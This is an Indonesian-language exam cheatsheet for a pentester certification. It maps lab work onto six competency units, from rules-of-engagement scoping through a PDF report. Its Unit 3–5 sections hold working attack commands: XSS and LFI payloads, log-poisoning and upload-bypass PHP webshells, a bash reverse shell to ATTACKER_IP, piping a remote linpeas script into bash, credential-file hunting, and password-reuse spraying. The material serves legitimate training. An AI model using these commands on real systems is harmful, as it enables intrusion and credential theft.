# 🎯 CHEATSHEET UKOM PENTESTER 
## Dipetakan 1:1 ke 6 Unit Kompetensi yang Dipraktikkan Asesi

> Sumber: `Kisi_Kisi_Praktik_Uji_Kompetensi.pdf` (Pusat Pengembangan SDM — BSSN)
> File ini **melengkapi**, bukan menggantikan, [pentester_cheatsheet.md](pentester_cheatsheet.md) —
> rujuk file tersebut untuk detail command eksploitasi umum (SQLi, RCE, dsb), tabel CVSS 4.0
> lengkap, dan kalimat dampak siap-tempel per kerentanan (Bagian 10 & 11 di file itu).
>
> **Fokus file ini:** urutan kerja yang PERSIS mengikuti 6 unit yang dinilai, dengan penekanan
> pada hal yang secara eksplisit disebut di kisi-kisi: RoE, CVSS wajib per temuan, enumerasi
> **berulang** pasca-foothold, kerentanan **XSS/LFI/Upload Bypass/Password Reuse** + pembedaan
> false positive, eksploitasi sampai **flag di direktori user**, dan laporan PDF dengan struktur
> **executive summary → summary temuan → POC/detail teknis → kesimpulan & rekomendasi**.

```
┌────┬──────────────────────────────┬───────────────────────────────────────────┐
│ #  │ Unit Kompetensi               │ Yang Dinilai (persis dari kisi-kisi)      │
├────┼──────────────────────────────┼───────────────────────────────────────────┤
│ 1  │ Menentukan Ruang Lingkup      │ RoE membatasi pengujian HANYA pada IP     │
│    │                                │ target yang telah disepakati              │
│ 2  │ Menentukan Metode Penilaian   │ Wajib skor CVSS v4.0 untuk SETIAP temuan  │
│ 3  │ Mengumpulkan Informasi        │ Port scan, enum web, enum pasca-foothold  │
│    │                                │ dilakukan SECARA BERULANG                 │
│ 4  │ Mencari Kerentanan            │ XSS, LFI, upload bypass, password reuse — │
│    │                                │ disertai pembedaan false positive         │
│ 5  │ Menguji Kerentanan            │ Eksploitasi aktual s.d. flag di direktori │
│    │                                │ user                                       │
│ 6  │ Menyusun Laporan              │ Deliverable PDF: exec summary - summary   │
│    │                                │ temuan - POC/detail teknis - kesimpulan   │
│    │                                │ & rekomendasi                             │
└────┴──────────────────────────────┴───────────────────────────────────────────┘
```

---

## 🧩 UNIT 1 — Menentukan Ruang Lingkup (RoE)

> ⚠️ Ini poin pertama yang dinilai. Salah scope = fatal, bisa gugur walau eksploitasi berhasil.

### Sebelum Jari Menyentuh Keyboard — Checklist

```
□ Catat SELURUH IP/host yang tertulis di dokumen RoE/soal ujian — salin persis, jangan menghafal
□ Konfirmasi rentang waktu pengujian (jam mulai–selesai) yang diizinkan
□ Konfirmasi metode yang diizinkan (Black/Grey/White Box) & teknik yang dikecualikan (mis. DoS dilarang)
□ Jika ragu satu IP termasuk scope atau tidak → JANGAN discan, tanyakan ke asesor/panitia dulu
□ Simpan RoE (screenshot/salinan) sebagai lampiran laporan akhir
```

### Template Ringkas RoE (isi & lampirkan di laporan — lihat Unit 6)

```
Nama Penguji        : [...]
Target yang Diizinkan : [daftar IP/host — HARUS lengkap & persis]
Di Luar Scope       : [IP/host/fitur yang dikecualikan, jika ada]
Metode              : Black Box / Grey Box / White Box
Waktu Pengujian     : [hari, tanggal, jam mulai–selesai, zona waktu]
Teknik Terlarang    : [mis. DoS, social engineering ke luar sistem, dsb]
Kontak Darurat      : [asesor/pengawas ujian]
```

### Validasi Scope Sebelum Scan (Jangan Skip)

```bash
# List-scan dulu (TIDAK mengirim paket ke host, cuma resolusi) untuk mengonfirmasi
# IP yang akan discan memang sesuai daftar RoE sebelum full scan
nmap -sL 10.10.10.0/24        # cek daftar, BUKAN scan aktif

# Baru setelah dicocokkan dengan RoE, jalankan scan aktif HANYA ke IP yang disepakati
nmap -sC -sV -p- 10.10.10.10
```

> 🔁 **Kaitan dengan Unit 3:** kalau saat pivoting dari foothold Anda menemukan host/IP internal
> BARU yang tidak tercantum di RoE, jangan langsung eksploitasi — itu tetap harus dalam batas
> scope yang disepakati (biasanya RoE lab ujian sudah mencakup seluruh subnet internal yang relevan,
> tapi tetap konfirmasikan asumsi ini di awal, bukan saat sudah dapat shell).

---

## 🧩 UNIT 2 — Menentukan Metode Penilaian (CVSS v4.0)

> ⚠️ Kisi-kisi eksplisit: **wajib** memberi skor CVSS v4.0 untuk **SETIAP** temuan — bukan hanya
> yang critical/high. Temuan low/info pun harus diberi vector string.

### Base Metrics — Isi Cepat (detail lengkap: `pentester_cheatsheet.md` Bagian 10)

```
Exploitability:
  AV (Attack Vector)      N=Network  A=Adjacent  L=Local  P=Physical
  AC (Attack Complexity)  L=Low      H=High
  AT (Attack Requirements)N=None     P=Present
  PR (Privileges Required)N=None     L=Low       H=High
  UI (User Interaction)   N=None     P=Passive   A=Active

Vulnerable System Impact:      Subsequent System Impact:
  VC/VI/VA: N=None L=Low H=High   SC/SI/SA: N=None L=Low H=High
```

### Format Vector String (wajib dicantumkan per temuan di laporan)

```
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
```

### Alur Kerja Per Temuan (lakukan untuk SETIAP entri di tabel temuan)

```
1. Tentukan 5 metrik Exploitability (AV/AC/AT/PR/UI) dari cara eksploitasi yang barusan dibuktikan
2. Tentukan VC/VI/VA berdasarkan dampak LANGSUNG ke sistem yang rentan
3. Tentukan SC/SI/SA HANYA jika dampak menjalar ke sistem/komponen LAIN (mis. lateral movement,
   akses cloud metadata) — jika tidak, isi N/N/N
4. Hitung via kalkulator: https://www.first.org/cvss/calculator/4.0
5. Catat: Vector String + Skor numerik + Label severity (Critical/High/Medium/Low/None)
6. Ulangi untuk temuan berikutnya — jangan lupa temuan Low/Info sekalipun
```

```
Skor       Severity
0.0        None
0.1 – 3.9  Low
4.0 – 6.9  Medium
7.0 – 8.9  High
9.0 – 10.0 Critical
```

---

## 🧩 UNIT 3 — Mengumpulkan Informasi (Recon Loop, Termasuk Pasca-Foothold)

> ⚠️ Kisi-kisi eksplisit: port scan, enumerasi web, DAN **enumerasi pasca-foothold dilakukan
> secara BERULANG**. Ini bukan siklus sekali jalan — setiap kali dapat akses baru (shell, user
> baru, host internal baru), ulangi recon dari awal terhadap posisi baru tersebut.

### Diagram Loop yang Dinilai

```
┌─────────────────────────────────────────────────────────────────────┐
│  (1) PORT SCAN     nmap -sC -sV -p- TARGET                          │
│         │                                                            │
│  (2) ENUM WEB      whatweb + gobuster/dirsearch + robots.txt        │
│         │                                                            │
│  (3) CARI VULN     XSS / LFI / Upload Bypass / Password Reuse       │
│         │                     (lihat Unit 4)                        │
│  (4) EKSPLOITASI → FOOTHOLD (shell / kredensial baru)                │
│         │                                                            │
│  (5) ENUM PASCA-FOOTHOLD  ← LANGKAH YANG SERING TERLEWAT             │
│         │  id, network interface, service internal, credential file │
│         │                                                            │
│         └──── ditemukan host/service/user BARU? ──► KEMBALI ke (1)  │
│                              │                                        │
│                              ▼ tidak ada lagi                        │
│                    FLAG DITEMUKAN DI DIREKTORI USER → lanjut Unit 6  │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.1 Recon Awal (Eksternal)

```bash
nmap -sC -sV -p- TARGET -oA scan_awal
nmap -Pn -sC -sV -p- --min-rate=1000 TARGET     # jika ICMP diblokir/lambat

whatweb -a 3 http://TARGET
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50
curl http://TARGET/robots.txt
```

### 3.2 Enumerasi Pasca-Foothold (WAJIB Diulang Setiap Dapat Akses Baru)

```bash
# ── Identitas & posisi ──
id; whoami; hostname
uname -a; cat /etc/os-release

# ── Lihat "dunia" dari sudut pandang host yang baru dikuasai ──
ip a                      # network interface — mungkin ada NIC ke subnet lain
ip route                  # cek apakah host ini jadi gerbang ke jaringan lain (dual-homed)
arp -a                    # host lain yang pernah dikontak dari box ini
cat /etc/hosts            # host internal yang sudah didaftarkan manual
cat /etc/resolv.conf
netstat -tulnp 2>/dev/null || ss -tulnp   # service yang listen LOKAL (localhost) — sering
                                          # tidak kelihatan dari luar saat port scan awal!

# ── Cari kredensial yang tertinggal (bahan Unit 4.4 - Password Reuse) ──
find / -iname "*.conf" -o -iname "*config*" 2>/dev/null | grep -iv "^/proc" | xargs grep -il "pass" 2>/dev/null
cat ~/.bash_history
find / -name "*.git" -type d 2>/dev/null
grep -r "password\|secret\|api_key" /var/www/ 2>/dev/null
cat /etc/passwd            # daftar user lokal — calon target password reuse
```

### 3.3 Scan Ulang Jaringan Internal DARI Foothold (Pivoting)

Karena host internal biasanya tidak reachable langsung dari mesin attacker, scan port harus
dijalankan **dari dalam** foothold. Jika `nmap` tidak tersedia di target, pakai pure bash:

```bash
# Port scan sederhana tanpa nmap (dijalankan DI DALAM shell target)
for port in $(seq 1 1000); do
  (echo >/dev/tcp/192.168.50.5/$port) >/dev/null 2>&1 && echo "192.168.50.5:$port OPEN"
done 2>/dev/null

# Host discovery cepat ke seluruh subnet internal (dari dalam shell target)
for ip in 192.168.50.{1..254}; do
  (ping -c1 -W1 $ip >/dev/null 2>&1 && echo "$ip UP") &
done; wait
```

Jika perlu menjalankan tool attacker (nmap/gobuster) ke jaringan internal, buat tunnel dulu:

```bash
# ── SSH local/dynamic port forward (jika foothold berupa akses SSH) ──
ssh -L 8080:192.168.50.5:80 user@TARGET          # forward 1 port spesifik
ssh -D 1080 user@TARGET                           # SOCKS proxy — lalu pakai proxychains

# ── Pakai proxychains supaya tool attacker bisa "masuk" ke jaringan internal ──
proxychains nmap -sT -Pn 192.168.50.5
proxychains curl http://192.168.50.5/

# ── Relay sederhana pakai socat (kalau tidak ada SSH, mis. via webshell) ──
socat TCP-LISTEN:8080,fork TCP:192.168.50.5:80
```

### 3.4 Ulangi Enum Web Jika Ditemukan Service HTTP Internal Baru

```bash
# Sama seperti 3.1, tapi target adalah host internal yang baru ditemukan
whatweb -a 3 http://192.168.50.5
gobuster dir -u http://192.168.50.5 -w /usr/share/wordlists/dirb/common.txt -x php,html -t 30
```

> ✅ **Kapan loop berhenti:** ketika flag di direktori user sudah ditemukan (Unit 5) dan tidak ada
> lagi host/kredensial baru yang relevan dengan RoE (Unit 1) untuk dieksplorasi.

---

## 🧩 UNIT 4 — Mencari Kerentanan: XSS, LFI, Upload Bypass, Password Reuse

> ⚠️ Kisi-kisi menyebut 4 kelas ini secara SPESIFIK, plus "pembedaan false positive". Artinya
> asesor menilai bukan cuma "ketemu payload nyangkut", tapi apakah asesi bisa **membuktikan**
> temuan itu benar-benar tereksploitasi, bukan sekadar sinyal lemah yang bisa salah tafsir.

### 4.1 Cross-Site Scripting (XSS)

```bash
# Payload dasar per konteks — coba di SEMUA titik input (form, parameter URL, header, upload filename)
<script>alert(document.domain)</script>
"><svg onload=alert(1)>
'><img src=x onerror=alert(1)>
javascript:alert(1)                      # jika input dipakai sebagai href/src

# Uji cepat via curl (lihat apakah payload dipantulkan APA ADANYA, tanpa encoding)
curl -s "http://TARGET/search?q=<script>alert(1)</script>" | grep -o "<script>alert(1)</script>"

# Scanner otomatis (BANTU triase, bukan pengganti verifikasi manual)
xsser -u "http://TARGET/search?q=XSS" --auto
```

**✅ Cara Membuktikan Bukan False Positive:**
```
□ Payload benar-benar tampil di HTML response TANPA di-encode (bukan &lt;script&gt;)
□ Buka di browser sungguhan → alert box/console log BENAR-BENAR muncul (bukan cuma "terlihat
  di curl" — beberapa WAF/browser mem-block eksekusi walau payload lolos ke response)
□ Cek header response: Content-Type text/html (bukan application/json/text/plain — payload di
  JSON API biasanya TIDAK tereksekusi sebagai HTML)
□ Cek Content-Security-Policy — jika CSP ketat (script-src 'self'), payload inline BISA diblokir
  browser meski "berhasil" masuk ke response → laporkan sebagai temuan dengan catatan mitigasi CSP
□ Untuk Stored XSS: buktikan payload PERSISTEN (muncul lagi setelah reload/relogin), bukan hanya
  reflected sekali di response yang sama
```

### 4.2 Local File Inclusion (LFI)

```bash
# Deteksi
curl "http://TARGET/index.php?page=../../../../etc/passwd"
curl "http://TARGET/index.php?page=....//....//....//etc/passwd"      # bypass filter str_replace
curl "http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=index.php"

# Eskalasi: log poisoning
curl -A "<?php system(\$_GET['cmd']); ?>" http://TARGET/
curl "http://TARGET/index.php?page=../../../var/log/apache2/access.log&cmd=id"
```

**✅ Cara Membuktikan Bukan False Positive:**
```
□ Isi response benar-benar berupa ISI FILE ASLI (mis. /etc/passwd berisi baris "root:x:0:0:...")
  — BUKAN sekadar pesan error PHP yang kebetulan menyebut nama file yang diminta
□ Ukuran/panjang response konsisten dengan ukuran file asli, bukan halaman error generik
  bertemplate sama untuk semua input
□ Bandingkan response untuk file yang PASTI ADA vs file acak yang PASTI TIDAK ADA — kalau
  responsnya identik di kedua kasus, kemungkinan itu false positive (bukan LFI beneran)
□ Untuk klaim "eskalasi ke RCE via log poisoning": buktikan sampai dapat output perintah
  (mis. ?cmd=id menampilkan uid=... nyata), bukan cuma asumsi "seharusnya bisa"
```

### 4.3 Upload Bypass

```bash
# Urutan coba (ringkas — detail lengkap: pentester_cheatsheet.md Bagian 4.2.1)
1. shell.php langsung
2. Ekstensi alternatif: shell.phtml / shell.php5 / shell.php7 / shell.phar
3. Ubah Content-Type di Burp: image/jpeg
4. Magic bytes: echo 'GIF89a<?php system($_GET["cmd"]);?>' > shell.php
5. Double extension: shell.php.jpg
6. Upload .htaccess dulu (AddType application/x-httpd-php .jpg) → lalu shell.jpg
```

**✅ Cara Membuktikan Bukan False Positive:**
```
□ Response upload memang 200/sukses — TAPI itu baru langkah 1, bukan bukti kerentanan
□ WAJIB akses file yang diupload dan buktikan file tereksekusi sebagai kode, bukan disajikan
  sebagai file statis: curl "http://TARGET/uploads/shell.php?cmd=id" harus mengembalikan
  OUTPUT PERINTAH NYATA (uid=33(www-data)...), bukan menampilkan isi source code PHP mentah
  (tanda file TIDAK dieksekusi, hanya diserving sebagai teks — berarti bypass ekstensi tidak
  cukup, server tidak treat file itu sebagai script)
□ Jika curl mengembalikan isi kode PHP mentah (bukan hasil eksekusi) → itu false positive untuk
  klaim RCE, meski upload-nya sendiri "berhasil"
□ Catat path lengkap file hasil upload sebagai bukti (screenshot response + curl command)
```

### 4.4 Password Reuse

> Kelas kerentanan ini SPESIFIK diminta di kisi-kisi — bukan brute force generik, tapi
> **memakai ulang kredensial yang sudah ditemukan** (dari config file, dump DB, file .git, dsb —
> hasil enumerasi Unit 3) ke service/host lain.

```bash
# ── Langkah 1: Kumpulkan kredensial dari hasil enumerasi (Unit 3.2) ──
# contoh: ditemukan di config.php → DB_USER=admin DB_PASS=Summer2026!

# ── Langkah 2: Coba kredensial itu ke SEMUA service yang ditemukan di port scan ──
# SSH
ssh admin@TARGET                                   # coba manual dulu, paling meyakinkan
netexec ssh TARGET -u admin -p 'Summer2026!'

# Ke banyak host internal sekaligus (hasil pivoting Unit 3.3)
netexec ssh internal_hosts.txt -u admin -p 'Summer2026!' --continue-on-success

# FTP
netexec ftp TARGET -u admin -p 'Summer2026!'

# Panel admin web (login form) — pakai kredensial yang sama
curl -X POST http://TARGET/login -d "username=admin&password=Summer2026!" -i

# HTTP Basic Auth
curl -u admin:'Summer2026!' http://TARGET/admin/

# ── Langkah 3: Password reuse ANTAR-USER di host yang sama juga wajib dicoba ──
# Jika user A punya password X, coba juga X untuk user B/root yang terdaftar di /etc/passwd
su - root      # coba password yang sama untuk root, jika ada indikasi reuse antar akun
```

**✅ Cara Membuktikan Bukan False Positive:**
```
□ Login BENAR-BENAR berhasil (dapat prompt shell / dashboard admin / HTTP 200+session valid) —
  bukan hanya "tidak ada pesan error" (beberapa app tetap balas 200 untuk login gagal juga)
□ Bedakan halaman "login gagal" vs "login sukses" berdasarkan konten/redirect/cookie session
  yang benar-benar berbeda, jangan asumsi dari status code HTTP saja
□ Untuk SSH/FTP: pastikan bukan akun guest/anonymous yang memang publik (itu misconfig lain,
  bukan password reuse)
□ Dokumentasikan DARI MANA kredensial ditemukan → KE MANA berhasil dipakai ulang (rantai bukti
  ini penting untuk POC di laporan, lihat Unit 6)
```

### 4.5 Prinsip Umum Membedakan False Positive (Berlaku untuk Semua Temuan)

```
1. Selalu buktikan DAMPAK NYATA, bukan indikasi tidak langsung (mis. bukan cuma "field tidak
   ada validasi", tapi "berhasil baca file X / eksekusi perintah Y / login sebagai Z")
2. Bandingkan respons target dengan baseline (request normal vs request dengan payload) —
   selisihnya harus konsisten dan bisa direproduksi
3. Reproduksi ulang temuan minimal 2x sebelum dicatat di laporan — hindari fluke/race condition
   yang tidak konsisten
4. Untuk setiap temuan yang masuk laporan, siapkan command/langkah PERSIS yang bisa direplay
   asesor (jadi bahan POC di Unit 6)
```

---

## 🧩 UNIT 5 — Menguji Kerentanan (Eksploitasi s.d. Flag di Direktori User)

> ⚠️ Target akhir eksploitasi menurut kisi-kisi: **flag di direktori user**. Setelah exploit
> berhasil, pekerjaan belum selesai sampai flag benar-benar ditemukan & dibaca.

### 5.1 Dari Vuln Terkonfirmasi (Unit 4) ke Shell

```bash
# Listener dulu
rlwrap nc -lvnp 4444

# Trigger sesuai vuln yang terbukti (contoh via upload webshell / LFI log poison / dsb)
curl "http://TARGET/shell.php" --get \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
```

### 5.2 Upgrade ke Full TTY (Wajib Agar Bisa `su`, arrow key, ctrl+c)

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → Enter dua kali → export TERM=xterm
```

### 5.3 Cari Flag di Direktori User

```bash
# Lokasi paling umum di lab exam (cek semua pola ini)
find / -iname "*flag*" 2>/dev/null
find / -iname "user.txt" -o -iname "local.txt" 2>/dev/null
ls -la /home/*/                       # lihat isi tiap direktori user
cat /home/*/flag.txt 2>/dev/null
cat /home/*/user.txt 2>/dev/null

# Jika flag ada di direktori user LAIN (bukan user yang baru didapat) → butuh privesc/pivot user
sudo -l                               # cek hak sudo dulu — command paling penting setelah shell
find / -perm -4000 -type f 2>/dev/null   # SUID binaries → cek GTFOBins
# Jika ada kredensial hasil Unit 4.4 (password reuse) untuk user pemilik flag → langsung su
su - <user_target>
```

### 5.4 Privesc Cepat (Jika Flag Butuh Akses User/Root Lain)

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null      # cek tiap binary di https://gtfobins.github.io/
cat /etc/crontab; ls -la /etc/cron*
getcap -r / 2>/dev/null

# LinPEAS SUDAH TERSEDIA LOKAL di image ini — tidak perlu download dari internet:
python3 -m http.server 8080 --directory /usr/share/peass/linpeas/    # di attacker
curl http://ATTACKER_IP:8080/linpeas.sh | bash                       # di target
```

### 5.5 Dokumentasikan Setiap Langkah (Bahan POC Unit 6)

```
□ Screenshot/simpan output SETIAP command eksploitasi kunci (payload → response → shell → flag)
□ Catat command PERSIS yang dipakai (copy-paste dari terminal, jangan ditulis ulang dari ingatan)
□ Catat isi flag yang ditemukan sebagai bukti akhir (redact sebagian jika diminta panitia)
□ Catat waktu (timestamp) tiap tahap — berguna untuk timeline di Executive Summary
```

---

## 🧩 UNIT 6 — Menyusun Laporan (Deliverable PDF)

> ⚠️ Kisi-kisi menetapkan struktur wajib: **Executive Summary → Summary Temuan →
> POC/Detail Teknis → Kesimpulan & Rekomendasi**, dan formatnya harus **PDF**.

### 6.1 Struktur Dokumen (Urutan Wajib)

```
1. COVER / IDENTITAS
   Nama penguji, tanggal, target, metode — samakan dengan RoE di Unit 1

2. EXECUTIVE SUMMARY
   Paragraf naratif (non-teknis, untuk manajemen): waktu pengujian, ruang lingkup, metode,
   fokus pengujian, dan tabel distribusi severity.
   → Template lengkap: pentester_cheatsheet.md Bagian 12

3. SUMMARY TEMUAN
   Tabel ringkas SEMUA temuan: No | Nama Kerentanan | Lokasi/Endpoint | Severity | Skor CVSS
   → Wajib mencantumkan skor CVSS v4.0 di baris SETIAP temuan (Unit 2) — termasuk yang Low/Info

4. POC / DETAIL TEKNIS (per temuan, ulangi template ini untuk setiap baris di Summary Temuan)
   a. Nama & Kategori Kerentanan (CWE + OWASP mapping)
   b. Deskripsi teknis (akar penyebab)
   c. Lokasi (URL/parameter/endpoint spesifik)
   d. CVSS v4.0 — Vector String + Skor + Severity
   e. Bukti (POC) — command/payload PERSIS + screenshot/output yang membuktikan (dari Unit 4.5/5.5,
      termasuk penjelasan singkat KENAPA ini bukan false positive)
   f. Dampak — kalimat siap pakai per jenis vuln: pentester_cheatsheet.md Bagian 11
   g. Rekomendasi remediasi — pentester_cheatsheet.md Bagian 11 (bagian "Rekomendasi" tiap vuln)

5. KESIMPULAN & REKOMENDASI KESELURUHAN
   Ringkasan risiko keseluruhan sistem, prioritas remediasi (mis. "segera perbaiki temuan
   Critical/High dalam X hari"), dan catatan penutup pengujian.
```

### 6.2 Checklist Sebelum Submit

```
□ SEMUA temuan (termasuk Low/Info) punya CVSS v4.0 vector string + skor (Unit 2)
□ Tidak ada placeholder tersisa ("192.168.xx", "[TARGET_IP]", "[n]") — semua sudah diisi data asli
□ Setiap temuan di POC punya bukti yang membedakan dari false positive (Unit 4.5)
□ Flag hasil Unit 5 dicantumkan sebagai bukti keberhasilan eksploitasi akhir
□ Jam & tanggal di Executive Summary valid (format 24 jam, hari+tanggal konsisten dgn kalender)
□ Ruang lingkup di laporan sama persis dengan RoE yang disepakati di Unit 1 — tidak lebih, tidak
  kurang
□ Dokumen di-export final sebagai PDF (mis. dari Word/LibreOffice Writer/Google Docs → Export/
  Save As PDF, atau `pandoc laporan.md -o laporan.pdf` jika tool tersedia)
```

---

## ✅ CHECKLIST AKHIR — Rekap 6 Unit

```
□ Unit 1: Scope tervalidasi terhadap RoE sebelum scan pertama dijalankan
□ Unit 2: CVSS v4.0 dihitung untuk SETIAP temuan, termasuk Low/Info
□ Unit 3: Recon awal + web enum + enum pasca-foothold dilakukan BERULANG sampai tidak ada
          host/user/service baru yang relevan
□ Unit 4: Minimal diuji XSS, LFI, Upload Bypass, Password Reuse — tiap temuan dibuktikan
          bukan false positive
□ Unit 5: Eksploitasi berhasil sampai flag di direktori user ditemukan & didokumentasikan
□ Unit 6: Laporan PDF final berisi Executive Summary, Summary Temuan, POC/Detail Teknis
          per temuan, dan Kesimpulan & Rekomendasi — tanpa placeholder tersisa
```

---
*Uji Kompetensi Pentester — Cheatsheet Sesuai Kisi-Kisi Resmi | 2026*
